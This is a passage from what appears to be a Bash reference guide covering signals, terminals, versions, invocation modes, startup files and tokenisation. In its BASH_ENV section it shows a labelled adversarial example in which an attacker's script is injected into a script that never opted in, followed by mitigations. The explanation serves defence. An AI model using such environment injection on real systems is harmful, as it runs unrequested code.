### `exit N` arithmetic and `WIFSIGNALED`

```bash
# wrong — relying on >255 status
exit 1000        # delivered as 232 (1000 % 256)

# right — keep within the 0-127 application range
exit 22          # invalid argument, BCS table
```

`WIFSIGNALED`, `WTERMSIG`, and `WCOREDUMP` are kernel-level macros wrapping the same status word; Bash reports the synthesised `128 + signum` form for shell scripts and reserves the kernel-level bits for `wait`'s C callers.

### `sysexits.h` legacy

The 64-78 range from BSD's `sysexits.h` (`EX_USAGE=64`, `EX_DATAERR=65`, …) is still seen in older Unix tooling but is not used in modern Bash. Treat it as reserved (do not collide), not as a target.

**See also**: §1.1 (`wait` reaps the status), §1.8 (signal taxonomy), §12 (signal handling), BCS0602 (exit codes), BCS0601 (exit on error), BCS0101 (strict mode).

## 1.8 Signals — overview

Signals are asynchronous notifications delivered to a process by the kernel or another process. Each has a default action (terminate, core-dump, ignore, stop, continue) and most can be caught with `trap` (BCS0110, BCS0603). This chapter introduces the model and enumerates the standard signals; the deep treatment of trapping, pseudo-signals, and signal-safe cleanup lives in Part XII.

Two delivery modes:

- Synchronous — provoked by the running thread itself (`SIGSEGV`, `SIGFPE`, `SIGILL`, `SIGBUS`).
- Asynchronous — sent from outside (`SIGINT` from `^C`, `SIGTERM` from `kill`, `SIGHUP` on terminal hangup).

Two signals cannot be caught, blocked, or ignored: `SIGKILL` (9) and `SIGSTOP` (19). Plan for them — never assume cleanup is guaranteed (see §12.3 and BCS1006 for the temp-file discipline that survives uncatchable death).

Common standard signals:

| Num | Name      | Default     | Typical cause                          |
|-----|-----------|-------------|----------------------------------------|
| 1   | SIGHUP    | terminate   | controlling terminal closed            |
| 2   | SIGINT    | terminate   | `^C` from terminal                     |
| 3   | SIGQUIT   | core-dump   | `^\` from terminal                     |
| 9   | SIGKILL   | terminate   | `kill -9` — uncatchable                |
| 13  | SIGPIPE   | terminate   | write to a pipe with no readers        |
| 15  | SIGTERM   | terminate   | polite shutdown request                |
| 17  | SIGCHLD   | ignore      | child changed state                    |
| 18  | SIGCONT   | continue    | resume a stopped process               |
| 19  | SIGSTOP   | stop        | uncatchable suspend                    |
| 20  | SIGTSTP   | stop        | `^Z` from terminal                     |
| 28  | SIGWINCH  | ignore      | terminal size changed                  |

Real-time signals occupy `SIGRTMIN`..`SIGRTMAX` (typically 34..64); they queue rather than coalesce and carry an integer payload. Bash exposes only the standard set to `trap`.

```bash
# scenario: list every signal name your kernel knows
kill -l                       # ⇒ HUP INT QUIT ILL TRAP ABRT BUS FPE KILL ...
# scenario: send a deliberate non-default signal
kill -USR1 "$$"               # default action for USR1 is "terminate" — don't try this without a trap
# scenario: encode signal exit status (128 + signo, see §1.7)
( trap '' TERM; kill -TERM "$BASHPID"; sleep 1 )
# the inner shell ignores TERM, so this is illustrative only
```

**See also**: §1.7 (exit status — signal-induced exits encode as 128+N), §11.1 (process groups and which signals propagate), §12.1–§12.6 (full signal reference, `trap` builtin, pseudo-signals EXIT/ERR/DEBUG/RETURN), Appendix K (signal default-action table).

## 1.9 The controlling terminal and TTY layer

Interactive Bash is intimately bound up with the controlling terminal. Two distinct concerns live behind the single word "TTY": the **terminal device** (what character device represents the keyboard and screen) and the **line discipline** (the kernel state machine that translates raw bytes into editable lines and synthesises keyboard signals).

### Terminal devices

| Path | Meaning |
|------|---------|
| `/dev/tty` | Per-process alias for "my controlling terminal". |
| `/dev/pts/N` | Pseudo-terminal slave end (created by `xterm`, `ssh`, `tmux`, etc.). |
| `/dev/console` | Kernel console; usually only accessible to PID 1 / root. |
| `/dev/ttyN` | Linux virtual console (Ctrl-Alt-F1…). |

A pseudo-terminal (PTY) is a master/slave pair: a terminal emulator opens the master, the shell runs on the slave. From the shell's perspective the slave is indistinguishable from a real serial line. The controlling terminal is acquired by `setsid(2)` followed by `ioctl(fd, TIOCSCTTY)` (or implicitly when `O_NOCTTY` is **not** set on first open).

### Line discipline

The line-discipline layer sits between the raw bytes coming off the terminal and what `read(2)` delivers to the shell.

```
keyboard ──► TTY driver ──► line discipline ──► /dev/pts/N ──► read(2) ──► bash
                              │
   ┌──────────────────────────┼──────────────────────────┐
   │ cooked (canonical)       │ raw                      │ cbreak
   │ - line buffered          │ - byte at a time         │ - byte at a time
   │ - editing keys (^U ^H)   │ - no editing             │ - no editing
   │ - delivers on ENTER      │ - delivers immediately   │ - signals still active
   │ - ^C → SIGINT            │ - no signals             │
   │ - ^Z → SIGTSTP           │                          │
   └──────────────────────────┴──────────────────────────┘
```

**Cooked mode** is the default for an interactive shell: the kernel buffers a line, lets the user edit with backspace, and delivers it only when ENTER is pressed. Keyboard signals (`Ctrl-C → SIGINT`, `Ctrl-\ → SIGQUIT`, `Ctrl-Z → SIGTSTP`) are synthesised by the line discipline, not by Bash. **Raw mode** is what `vim`, `less`, and any TUI using `readline` switches to: each byte arrives instantly and editing characters lose their special meaning.

The foreground process group is the only one allowed to `read` from the terminal; background readers receive `SIGTTIN` and stop until brought to foreground. Window resize emits `SIGWINCH` to the foreground group; `$LINES` and `$COLUMNS` (interactive only) are updated by the shell's handler.

### Inspection

```bash
# scenario: inspect the controlling terminal and its discipline
tty                          # ⇒ /dev/pts/3   (or "not a tty")
[[ -t 0 ]] && echo 'stdin is a tty' || echo 'stdin redirected'
[[ -t 1 ]] || echo 'stdout is a pipe — disable colour'
stty -a | head -3            # current line-discipline settings
stty size                    # ⇒ rows cols
```

`stty -a` reveals the full discipline state: `icanon` (cooked vs raw), `echo`, `isig` (Ctrl-C synthesis), `intr = ^C`, `susp = ^Z`. `stty -icanon -echo` is what TUIs do programmatically via `tcsetattr(3)`.

### Practical use of `[[ -t N ]]`

A script that auto-disables colour when redirected respects pipelines and CI logs:

```bash
# scenario: only emit ANSI colour when stdout is a tty
declare -- RED=''
if [[ -t 1 ]]; then RED=$'\033[31m'; fi
echo "${RED}error${RED:+$'\033[0m'}"
```

**See also**: §1.8 (signal overview — terminal signals are a subset), §11.6 (process groups and foreground/background scheduling), §12 (trap handling), §22 (interactive shell), BCS0708 (terminal capabilities), BCS0707 (TUI basics).

# Part II — Bash as a Program

*Bash is a specific program with a specific history, a specific build configuration, and specific invocation modes. This Part documents what bash actually is — distinct from "the shell" generically — so the reader can reason about which version they have, how it was built, and how it was invoked.*

---

---

## 2.1 Genealogy and the shell family

Bash sits inside a family of shells with distinct ancestries. Knowing the relationships clarifies which features are universal, which are bash-specific, and what to expect when porting to a sibling. The lineage matters for portability claims (BCS0102 only sanctions a Bash shebang; targeting sh-style shells means writing different code, not the same code).

Two main branches descend from Bourne's original `sh` (Version 7 Unix, 1979):

The Bourne / POSIX line:

- **Bourne shell** (`sh`, 1977/1979) — Stephen Bourne at Bell Labs. The substrate of every modern Unix shell.
- **Korn shell** (`ksh88` 1988, `ksh93` 1993, `mksh` fork 2003) — David Korn's superset. First to add associative arrays, `[[`, `((`, and many features Bash later absorbed.
- **Almquist shell** (`ash` 1989, `dash` 2002) — minimal POSIX-compliant rewrite. `dash` is `/bin/sh` on Debian and Ubuntu, and is the canonical "is it really POSIX?" reality check.
- **BusyBox `sh`** — `ash`-derived; the embedded-systems default.
- **Bash** (1989) — Brian Fox's GNU clone of `sh` with `ksh` and `csh` features bolted on. Maintained by Chet Ramey since 1992.

The C-shell offshoot:

- **C shell** (`csh`, 1978) — Bill Joy at Berkeley. Different syntax (`if (cond) then`), now obsolete for scripting.
- **TENEX C shell** (`tcsh`) — interactive `csh` with line editing.

The reimaginings:

- **Z shell** (`zsh`, 1990) — Paul Falstad. Rich interactive shell with substantial `ksh`/`bash` compatibility but its own scripting idioms; macOS default login shell since 10.15 (2019).
- **macOS Bash 3.2** (2006) — the perpetual outlier. Apple froze at 3.2.57 over GPLv3 licensing concerns; modern Bash is available via Homebrew or MacPorts (see §23.6).

Standardisation: POSIX 1003.2 (1992) and SUS / IEEE 1003.1 (current revision: 2024) define the portable subset every serious shell aims at. Bash's `--posix` mode disables most extensions and conforms to that baseline.

**See also**: §2.2 (version landscape — what each Bash release added), §2.7 (`--posix` and other invocation modes), §23.6 (macOS Bash 3.2 mitigations), §23.3 (Bash vs `dash` portability gotchas).

## 2.2 Bash version landscape

Bash's feature set has grown substantially since 4.0 (2009). Targeting a specific minimum is a load-bearing decision: scripts that rely on `mapfile -d` (4.3) or `${var@Q}` (4.4) silently fall back to broken behaviour on older Bashes. Use `BASH_VERSINFO` for a runtime gate (BCS0409) rather than a comment that says "needs Bash 4.4+".

Release-by-release additions:

- **3.2 (2006)** — the macOS perpetual baseline. No associative arrays, no `mapfile`, no `coproc`.
- **4.0 (2009)** — associative arrays (`declare -A`), `coproc`, `mapfile`/`readarray`, `&>>`, `**` globstar, `;&`/`;;&` case fall-through, `read -i`, autocd.
- **4.1 (2009)** — `printf -v` writes into named variable, `BASH_XTRACEFD` for redirected `set -x`, `&>` standardised.
- **4.2 (2011)** — `declare -g` (assign global from function), `printf '%(fmt)T'` (strftime built-in), `lastpipe` shopt.
- **4.3 (2014)** — namerefs (`declare -n`), `mapfile -d` for custom record separators, `wait -n`, negative subscripts on indexed arrays.
- **4.4 (2016)** — parameter transforms `${var@Q/E/P/A/a/K/k/U/u/L}` (BCS0306), `local -` (save/restore options), `mapfile` callback improvements, `BASH_REMATCH` made readonly.
- **5.0 (2019)** — `EPOCHSECONDS`, `EPOCHREALTIME`, `BASH_ARGV0` (writable `$0`), `history -d` ranges, `assoc_expand_once`.
- **5.1 (2020)** — `SRANDOM` (cryptographically-seeded), `BASH_REMATCH` reset on regex failure, `wait -p` to capture PID.
- **5.2 (2022)** — recursive bison grammar for `$(…)`, `varredir_close` shopt, `${var@k}` (assoc-array key-value pairs), `globskipdots`, `noexpand_translation`, `patsub_replacement`.
- **5.3 (2025)** — no-fork command substitution `${ cmd; }`, expanded `compgen`, further globbing options (§25).

```bash
# scenario: gate a script on a minimum Bash and bail loudly on macOS 3.2
if (( BASH_VERSINFO[0] < 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] < 4) )); then
  printf 'requires Bash >= 4.4 (have %s)\n' "$BASH_VERSION" >&2
  exit 1
fi
# inspect the full tuple
printf '%s\n' "${BASH_VERSINFO[@]}"
# ⇒ 5
# ⇒ 2
# ⇒ 21
# ⇒ 1
# ⇒ release
# ⇒ x86_64-pc-linux-gnu
```

The full version-feature matrix is in Appendix M; treat it as the authoritative cross-reference when porting.

**See also**: §2.3 (build-time feature detection), §2.7 (`--version`), §23.6 (macOS 3.2 workarounds), §25 (5.3 preview), Appendix M (full feature matrix).

## 2.3 Build configuration and feature detection

Bash is configurable at compile time. Distributions disable some features; some versions add features behind `--enable-` flags. A script that needs `extglob`, loadable builtins, or restricted-mode awareness must detect those at runtime rather than trust the platform — the version number alone is not enough (BCS0409).

What is inspectable at runtime:

- `bash --version` — printable version string for humans.
- `BASH_VERSION` — the same string in-process.
- `BASH_VERSINFO[0..5]` — programmatic tuple: major, minor, patch, build, release, machtype.
- `${BASH_VERSINFO[5]}` — `machtype` (e.g. `x86_64-pc-linux-gnu`); reflects the configure-time triplet.
- `shopt` — runtime feature flags; `shopt -p name` prints the assignable form.
- `enable -p` (enabled builtins), `enable -a` (all known, including disabled), `enable -f file.so name` (loadable builtins, only if `--enable-loadable-builtins`).
- `compgen -b` — builtin enumeration as completion candidates.
- `declare -n ref=var 2>/dev/null` — namerefs only work from 4.3 onwards.

```bash
# scenario: probe for the features a script depends on
require_feature() {
  local -- name="$1"
  if ! shopt -q "$name" 2>/dev/null && ! shopt -s "$name" 2>/dev/null; then
    printf 'shopt: %s unavailable in this Bash\n' "$name" >&2
    return 1
  fi
}
require_feature extglob
require_feature globstar
require_feature inherit_errexit          # BCS0101
```

```bash
# scenario: detect a loadable builtin without crashing on stripped builds
if enable -f /usr/lib/bash/realpath realpath 2>/dev/null; then
  : 'realpath builtin loaded — no fork per call'
else
  : 'fall back to /bin/realpath'
fi
# scenario: enumerate currently enabled builtins
enable -p | head -3
# ⇒ enable .
# ⇒ enable :
# ⇒ enable [
```

Runtime feature detection beats compile-time speculation: probe what you need, fall back gracefully, and announce the diagnosis (BCS0701 messaging discipline).

**See also**: §2.2 (release feature additions), §2.7 (`-O`/`+O` to set `shopt` from the command line), §3 (lexical features whose availability depends on `extglob`/`globstar`), §10.4 (loadable-builtin patterns), §20.14 (restricted-shell detection).

## 2.4 Invocation modes

Bash behaves differently depending on how it was invoked. Confusing the modes is the most common source of "works in my terminal, breaks in cron" bugs — the cron environment is non-interactive, non-login, with a stripped `PATH` and no aliases.

### The four-quadrant matrix

Two orthogonal axes — `interactive | non-interactive` × `login | non-login` — define which startup files are read (see §2.5) and which features (job control, prompt, history) are enabled.

| | **Login** | **Non-login** |
|---|---|---|
| **Interactive** | SSH login, console TTY login, `bash -l`. Reads `/etc/profile` then the first of `~/.bash_profile`, `~/.bash_login`, `~/.profile`. Job control on. | Terminal emulator window inside an existing session, `bash` with no flags from another shell. Reads `/etc/bash.bashrc`, `~/.bashrc`. Job control on. |
| **Non-interactive** | `bash -l script.sh`, `su - user -c …`. Reads login files. Rare — only for cron-like scenarios that explicitly want a login environment. | `bash script.sh`, `bash -c '…'`, `ssh host cmd`, **cron**. Reads `BASH_ENV` only. Job control off. **The cron quadrant.** |

The bottom-right cell is where most surprises happen: cron runs your script with no aliases, no `~/.bashrc`, and a minimal `PATH` (usually `/usr/bin:/bin`).

### Detecting the mode at runtime

```bash
# scenario: emit a one-line classification of the current shell
mode='non-interactive non-login'
[[ $- == *i* ]] && mode="interactive ${mode#non-interactive }"
shopt -q login_shell && mode="${mode/non-login/login}"
echo "$mode"
# bash      ⇒ interactive non-login
# bash -l   ⇒ interactive login
# bash -c   ⇒ non-interactive non-login
# ssh host bash -lc ''  ⇒ non-interactive login
```

`$-` contains the current short option flags: `i` for interactive, `m` for job control. `shopt -q login_shell` is the canonical login detection.

### The cron pitfall

```bash
# scenario: a script that "works in the terminal" but fails in cron
# crontab:  * * * * * /home/me/run.sh
# run.sh contains:  ll /var/log

# wrong — depends on alias from ~/.bashrc, which cron does not source
ll /var/log 2>&1 || true   # → "ll: command not found" in a minimal env

# right — use the real command and pin PATH (BCS1002)
declare -rx PATH='/usr/local/bin:/usr/bin:/bin'
mkdir -p /tmp/_loglike && : > /tmp/_loglike/syslog
ls -l /tmp/_loglike | head -1                       # ⇒ total
# (in production this is `ls -l /var/log` — sandbox uses a fixture path)
```

### Single-command and stdin modes

`bash -c 'cmd args' name arg1 arg2` runs the string with `$0=name`, `$1=arg1`, `$2=arg2`. `bash -s` (or no script argument) reads commands from stdin — useful for piping a generated script:

```bash
# scenario: pipe a script body into bash with positional args
printf '%s\n' 'echo "$0 saw $#: $*"' | bash -s -- foo bar
# ⇒ bash saw 2: foo bar
# (`bash -s --` reads the script from stdin and treats the rest as $1, $2,
#  ... with $0 still "bash"; without `--` the first arg also lands in $@)
```

### Selected flags

| Flag | Effect |
|------|--------|
| `-i` | Force interactive (rarely needed; the test on stdin handles it). |
| `-l`, `--login` | Force login behaviour. |
| `-r`, `--restricted` | Restricted shell — no `cd`, no `PATH`/`SHELL`/`ENV` mutation, no `exec` of programmes containing `/`. See §20.14 and §23. |
| `--posix` | POSIX conformance. Strict-mode scripts do not need it. |
| `--noprofile` | Skip login startup files. |
| `--norc` | Skip `~/.bashrc`. |
| `--rcfile FILE` | Read `FILE` instead of `~/.bashrc`. |

The `sh` symlink invocation (`#!/bin/sh` plus a `bash`-as-`sh` install) makes Bash mimic POSIX `sh` — relevant when shipping to systems where `/bin/sh` is dash or ash. BCS0102 mandates an explicit Bash shebang specifically to avoid this ambiguity.

**See also**: §2.5 (which startup files each mode reads), §2.7 (full bash CLI option matrix), §20.14 / §23 (restricted shell), BCS0102 (shebang), BCS1002 (PATH security).

## 2.5 Startup file chains

Each invocation mode reads a different chain of startup files. This chapter is the canonical map of which files are sourced when, in what order, and why the `.bashrc`-from-`.bash_profile` idiom exists.

### Files-by-mode flowchart

```
                ┌──────────────────────────────────┐
                │ How was bash invoked?            │
                └──────────────┬───────────────────┘
                               │
        ┌──────────────────────┼──────────────────────┐
        ▼                      ▼                      ▼
   LOGIN shell          INTERACTIVE non-login    NON-INTERACTIVE
   (-l, --login,        (terminal emulator,      (bash script,
    SSH login,           subshell of login)       bash -c, cron)
    console login)
        │                      │                      │
        ▼                      ▼                      ▼
   /etc/profile         /etc/bash.bashrc        ${BASH_ENV}
        │              (Debian/Ubuntu;           if set and
        ▼               RHEL uses /etc/          file exists;
   first existing of:   bashrc; macOS none)      no system file
   ~/.bash_profile             │
   ~/.bash_login               ▼                       │
   ~/.profile           ~/.bashrc                      ▼
        │                      │              (no profile, no rc)
        ▼                      ▼
   (interactive prompt)    (interactive prompt)

  On EXIT of a login shell:  ~/.bash_logout, then /etc/bash.bash_logout
```

The login chain runs **once per login session**; the interactive non-login chain runs **once per terminal window** that is not itself a login shell. `BASH_ENV` is the only file Bash reads for non-interactive invocations; in POSIX mode the equivalent is `ENV`.

The system-wide interactive non-login file path varies by distribution: Debian and Ubuntu use `/etc/bash.bashrc` (Bash is built with `-DSYS_BASHRC`); RHEL/Fedora wire `/etc/bashrc` from `~/.bashrc`; macOS ships nothing system-wide. Test with `bash -ic 'echo $-'` and inspect what was sourced.

### The `.bashrc`-from-`.bash_profile` idiom

A login shell does **not** read `~/.bashrc`. A subshell of that login does. Result: alias and function definitions in `~/.bashrc` are invisible at the login prompt itself. The standard fix is to source `~/.bashrc` from `~/.bash_profile`:

```bash
# ~/.bash_profile
# scenario: ensure interactive aliases/functions are available at login
[[ -f ~/.bashrc ]] && source ~/.bashrc

# put login-only setup (PATH augmentation, ssh-agent launch) AFTER this line
export PATH="$HOME/.local/bin:$PATH"
```

Without this, you log in via SSH, type `ll`, and get "command not found" — but the same alias works in a `tmux` pane started from the login shell. Sourcing `~/.bashrc` first lets login add to the same configuration; doing it last would mean `~/.bashrc` clobbers login-only `PATH` entries.

### `BASH_ENV` for non-interactive scripts

Cron-launched scripts and `ssh host bash script.sh` are non-interactive. The shell skips every `*rc` and `*profile` file. The single hook is `BASH_ENV`:

```bash
# scenario: give cron jobs access to a shared init file
# In crontab:
#   BASH_ENV=/etc/cron-env.bash
#   * * * * * bash /usr/local/bin/job.sh

# /etc/cron-env.bash
export PATH='/usr/local/bin:/usr/bin:/bin'
export TZ='Asia/Jakarta'
```

`BASH_ENV` is not searched on `$PATH` — it must be an absolute path — and it is **not** read for `bash --posix` (use `ENV` instead).

### Common pitfalls

```bash
# wrong — interactive-only code in ~/.bash_profile
PS1='\u@\h:\w\$ '            # has no effect under bash -c

# right — interactive cosmetics belong in ~/.bashrc
# (and ~/.bash_profile sources ~/.bashrc, see idiom above)

# wrong — environment variables only in ~/.bashrc
export EDITOR=vim            # missing under  ssh host 'echo $EDITOR'

# right — exported env in profile chain (or both, with .bashrc sourced)
```

The asymmetric rule of thumb: **prompt, aliases, completion in `~/.bashrc`; `PATH`, `EDITOR`, `LANG` in `~/.bash_profile`** — and chain them with the idiom above so both are available everywhere.

**See also**: §2.4 (which mode triggers which chain), §2.6 (`BASH_ENV` and `ENV` semantics), §2.8 (exit lifecycle and `~/.bash_logout`), §1.5 (environment propagation), BCS0111 (configuration file loading).

## 2.6 `BASH_ENV` and `ENV`

Two specific environment variables that control startup-file sourcing for non-interactive shells. Often overlooked, occasionally weaponised in exploits, always worth understanding under any security model.

The two variables:

- **`BASH_ENV`** — when Bash is invoked non-interactively (e.g. running a script), it expands `$BASH_ENV`, performs PATH lookup if the result is unqualified, and sources the resulting file before running the script. Set it and any non-interactive Bash inherits the contents.
- **`ENV`** — analogous but only honoured when Bash runs in POSIX mode (`--posix` or invoked as `sh`). In standard Bash mode it is silently ignored.

Both are subject to expansion and (for `BASH_ENV`) PATH resolution. SUID Bash scripts are forbidden by BCS1001 (and disabled by the kernel under Linux), but a non-SUID Bash invoked from a SUID C wrapper would still read these variables — historically the route to several CVEs, and the reason `bash` ignores them when its `ruid != euid`.

```bash
# scenario: a per-tenant init that runs before any non-interactive script
cat >/etc/bash-tenant-init.sh <<'EOF'
export TENANT_ID=acme
umask 0027                    # BCS1006 — restrictive defaults
EOF
BASH_ENV=/etc/bash-tenant-init.sh bash -c 'printf tenant=%s umask=%s\\n "$TENANT_ID" "$(umask)"'
# ⇒ tenant=acme umask=0027
```

The same mechanism in adversarial hands:

```bash
# wrong — BASH_ENV honoured from the caller's environment
BASH_ENV=/tmp/evil.sh bash innocent-script.sh
# (innocent-script never opted in; /tmp/evil.sh runs anyway)
```

Mitigations under any hardened invocation: `unset BASH_ENV ENV` at the head of long-lived service scripts (BCS1007 environment-scrubbing pattern) and refuse to source files outside a known directory.

`BASH_ENV` is sourced **before** the script's own code; it cannot inspect `$0`, `$@`, or any of the script's logic before running.

**See also**: §2.4 (interactive vs non-interactive invocation), §2.5 (full startup-file chain — `BASH_ENV` is the non-interactive equivalent of `~/.bashrc`), §10 (security — `unset` hostile environment, sanitise `IFS` and `PATH`), §20.8 (why SUID scripts are doubly forbidden).

## 2.7 Command-line options to bash itself

The bash binary accepts both single-character and `--`-prefixed long options. This is the cheatsheet — what each does, when you would reach for it. The options interact with `set` (most of these are equivalent to a `set` call inside the script) and with the invocation modes documented in §2.4.

| Option         | Equivalent to        | Effect                                                       |
|----------------|----------------------|--------------------------------------------------------------|
| `-c STRING`    | —                    | Execute STRING as a one-shot script; remaining args become `$0 $1 …` |
| `-i`           | —                    | Force interactive even without a tty                         |
| `-l`, `--login`| `bash --login`       | Behave as a login shell (sources `~/.profile` chain, §2.5)   |
| `-r`, `--restricted` | —              | Restricted shell (§20.14)                                    |
| `-s`           | —                    | Read commands from stdin even when arguments are present     |
| `-x`           | `set -x`             | Trace every command before execution                         |
| `-v`           | `set -v`             | Echo input lines as read                                     |
| `-e`           | `set -e`             | Exit on error (BCS0101)                                      |
| `-u`           | `set -u`             | Treat unset variables as errors (BCS0101)                    |
| `-o NAME`      | `set -o NAME`        | Set a long option (`pipefail`, `errtrace`, …)                |
| `-O NAME`      | `shopt -s NAME`      | Set a `shopt` option                                         |
| `+O NAME`      | `shopt -u NAME`      | Unset a `shopt` option                                       |
| `--norc`       | —                    | Skip `~/.bashrc` (interactive only)                          |
| `--noprofile`  | —                    | Skip the login-mode profile chain                            |
| `--rcfile FILE`| —                    | Use FILE instead of `~/.bashrc`                              |
| `--posix`      | `set -o posix`       | POSIX-conformance mode                                       |
| `--noediting`  | —                    | Disable readline in interactive mode                         |
| `--debugger`   | —                    | Enable debugger hooks (used by `bashdb`)                     |
| `--version`    | —                    | Print version and exit                                       |
| `--help`       | —                    | Brief help and exit                                          |

```bash
# scenario: launch a child Bash with extglob and globstar already active
bash -O extglob -O globstar -c 'shopt extglob globstar'
# ⇒ extglob
# ⇒ globstar
# (each line ends with `<TAB>on`; `shopt` uses tab as the separator)
# scenario: one-shot script with positional args
bash -c 'printf "%s\n" "$@"' _ apple banana cherry
# ⇒ apple
# ⇒ banana
# ⇒ cherry
```

```bash
# scenario: trace a buggy startup quickly
bash -x -c 'for i in 1 2 3; do echo "$i"; done'
# ⇒ + for i in 1 2 3
# ⇒ + echo 1
# ⇒ 1
# ...
```

**See also**: §2.4 (which combination of `-i`/`-l`/`-c` makes a shell interactive vs login), §2.5 (`--rcfile`, `--noprofile` interaction with the startup chain), `set` and `shopt` builtins (§30.43, §30.45), §20.14 (`--restricted`).

## 2.8 Exit and shell session lifecycle

How and when Bash terminates, what runs at exit, and the boundary between the script's exit and the parent shell's lifecycle. The `EXIT` pseudo-trap is the bedrock of cleanup discipline (BCS0110, BCS0603); understanding when it fires — and when it does **not** — is non-negotiable.

Causes of exit:

- `exit N` — terminate the current shell with status `N` (truncated to 8 bits, see §1.7).
- End of script — implicit `exit` with the status of the last command.
- Fatal signal — exit status `128 + signo` (e.g. `SIGINT` ⇒ 130).
- `set -e` — uncaught failure terminates the shell.
- `return` outside a function or sourced file — error.

The `EXIT` trap fires once, exactly once, at any normal cause of exit (including signal-induced exit when the signal is also trapped). It does **not** fire when the shell is replaced by `exec`, nor when the kernel kills the shell with `SIGKILL` (uncatchable).

Subshell semantics, precisely stated:

- A subshell (child Bash from `(...)`, `$(...)`, `cmd &`, `|`) inherits the parent's traps initially, but its own exit fires its own `EXIT` trap, not the parent's.
- `set -E` (`errtrace`) propagates the **`ERR`** trap into functions, command substitutions, and subshells. It has no effect on `EXIT`.
- `set -T` (`functrace`) propagates `DEBUG` and `RETURN` similarly. Again, no effect on `EXIT`.
- The `EXIT` trap is a per-shell construct; you cannot make a subshell "skip" or "share" the parent's `EXIT` trap.

Other lifecycle hooks:

- `~/.bash_logout` — sourced on login-shell exit only.
- `shopt -s huponexit` — interactive shell sends `SIGHUP` to background jobs on exit.
- `exec CMD` — replaces the Bash image; no exit, no `EXIT` trap, no `~/.bash_logout`.
- `kill -KILL $$` — uncatchable; no trap fires; no cleanup.

```bash
# scenario: a cleanup trap that runs only in the parent shell
declare -- tmp
tmp=$(mktemp) || exit 5
trap 'rm -f -- "$tmp"' EXIT       # BCS0603 — single-quoted so $tmp resolves at trap time
( printf 'subshell uses %s\n' "$tmp"; exit 0 )
# the subshell's own EXIT trap is empty by default — parent's trap is NOT inherited at fire-time
echo "back in parent: $tmp still exists -> $([[ -f $tmp ]] && echo yes)"
# ⇒ subshell uses /tmp/tmp.XXXXXX
# ⇒ back in parent: /tmp/tmp.XXXXXX still exists -> yes
# (the trap fires once when the script ends)
```

The only reliable cleanup for uncatchable death is filesystem layout: prefer `mktemp -d` under a directory you `rm -rf` later, and never leave secret material in long-lived predictable paths (BCS1006).

**See also**: §1.7 (exit status encoding, signal-induced exits), §1.8 (signals overview), §12.5 (`trap` builtin in depth), §12.6 (pseudo-signals `EXIT`/`ERR`/`DEBUG`/`RETURN`), §20 (cleanup discipline under uncatchable signals).

# Part III — Lexical Structure and Shell Grammar

*Before any expansion, before any execution, bash tokenises and parses input. This Part documents the language at the level of characters and grammar — the rules that determine what counts as a word, an operator, or a reserved word.*

---

---

## 3.1 Tokenisation

Bash splits its input into **tokens** — *words* and *operators* — before
any expansion happens. The tokeniser is purely lexical: it knows about
characters, quoting, and longest-match operator recognition, but
nothing about variables, builtins, or aliases. Every later stage
(expansion, parsing, execution) is built on top of the token stream
this layer produces, so most "why doesn't this parse?" questions are
really tokenisation questions in disguise.

### The character classes

The tokeniser recognises four classes of unquoted character:

| Class | Members | Effect |
|-------|---------|--------|
| Blank | space, tab | Ends the current word; not part of any token. |
| Metacharacter | space, tab, newline, `\|`, `&`, `;`, `(`, `)`, `<`, `>` | Always ends a word; some begin operators. |
| Control operator | `\|\|`, `&&`, `&`, `;`, `;;`, `;&`, `;;&`, `\|`, `\|&`, `(`, `)`, newline | A token in its own right; controls list/pipeline structure. |
| Word constituent | everything else, plus *anything quoted* | Accumulated into the current word. |

A newline is both a blank and a metacharacter — outside an unfinished
construct it terminates the command list; inside (`if`, `{ … }`, an
open quote) it is just whitespace.

### Words versus operators

A **word** is a maximal run of word constituents, possibly including
quoted regions. An **operator** is a single token recognised from the
control-operator set above. The distinction matters because:

- Operators are recognised by **longest match**: `&&` is one token, not
  two `&` tokens, and `<<` is the here-doc operator, not "redirect
  followed by redirect".
- Word boundaries are decided *before* expansion. `$var` is one word
  during tokenisation regardless of what `$var` later expands to (this
  is why unquoted expansions split — splitting happens later, on the
  expanded result).
- Reserved words (§3.2) are words that the *parser* later promotes to
  syntactic keywords; the tokeniser itself emits them as plain words.

### Worked example: tokenising `[[ -f $f ]]`

```bash
# scenario: trace the token stream of a typical conditional.
# input:  [[ -f $f ]]
# tokens: WORD([[)  WORD(-f)  WORD($f)  WORD(]])
```

Four words, three blanks. The blanks are mandatory: `[[-f` would be a
single word (`[[-f`) which is *not* the reserved word `[[`, so the
parser would treat it as a command name and bash would try to execute
a program literally called `[[-f`. The same logic explains why `((`
is parsed as `( (` (two subshell-open tokens, not the arithmetic
opener) when written `( (expr))` with a space — longest-match runs
left-to-right at the *operator* level only, not across word/operator
boundaries.

### Worked example: quoting freezes word boundaries

```bash
# scenario: show that quoting overrides every blank inside it.
set -- a"b c"d "e f"
printf '[%s]\n' "$@"
# ⇒ [ab cd]
# ⇒ [e f]
```

The first argument is **one** word — `a`, the quoted run `b c`, then
`d` — concatenated by adjacency. Tokenisation respects the quotes;
the embedded space never reaches the word-boundary logic. This is the
mechanism that makes `"$var"` safe regardless of the variable's
contents.

### Operator-recognition corner cases

Three patterns trip up readers and linters alike:

- **`&&` versus `& &`**: written together, longest-match consumes both
  `&` characters as one logical-AND operator. Separated by a space,
  the tokeniser emits two `&` control operators, which the parser
  reads as "background the empty command, then background again" — a
  syntax error.
- **`<<` versus `< <`**: `<<` is the here-doc operator; `< <` is two
  redirections, valid only with process substitution between them
  (`cmd < <(producer)`).
- **`;;` inside `case`**: `;;`, `;&`, `;;&` are *only* recognised as
  control operators inside a `case` body. Elsewhere the parser
  rejects them, and a stray `;;` is a common cause of obscure error
  messages outside of `case`.

### Why `((` and `[[` need their spaces

The reserved words `[[`, `]]`, `((`, `))` are recognised by the
*parser* on a fully-formed word boundary. The tokeniser does not know
they are special — it just produces words. So:

- `[[ -f $f ]]` → four words `[[`, `-f`, `$f`, `]]`. The parser
  sees the first word and enters conditional-command mode.
- `[[-f $f]]` → two words `[[-f` and `$f]]`. The parser tries to run
  a command literally named `[[-f`. The error message ("command not
  found") arrives long after the real bug.

The pattern generalises: any "special" syntactic marker that is
written without a magic operator character must be space-separated
from its arguments. This is also why `function name(){}` works (the
`(` is itself a metacharacter that starts a new token) but
`if[[…]]then` does not.

### Strict-mode interaction

`set -e` and `set -u` operate on the parsed/executed command, not on
tokens, so token-level mistakes (a missing space around `[[`, a
forgotten `;` before `then`) surface as parse errors **before** strict
